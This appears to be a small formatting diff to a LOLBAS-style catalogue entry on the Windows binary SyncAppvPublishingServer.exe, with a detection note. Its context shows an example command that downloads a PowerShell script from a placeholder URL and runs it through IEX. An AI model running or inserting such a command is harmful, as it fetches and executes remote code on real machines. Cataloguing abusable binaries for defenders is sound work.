@@ -2,7 +2,7 @@
 Name: SyncAppvPublishingServer.exe
 Description: Used by App-v to get App-v server lists
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
     Description: Example command on how inject Powershell code into the process
@@ -15,7 +15,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\SyncAppvPublishingServer.exe
   - Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
  - IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
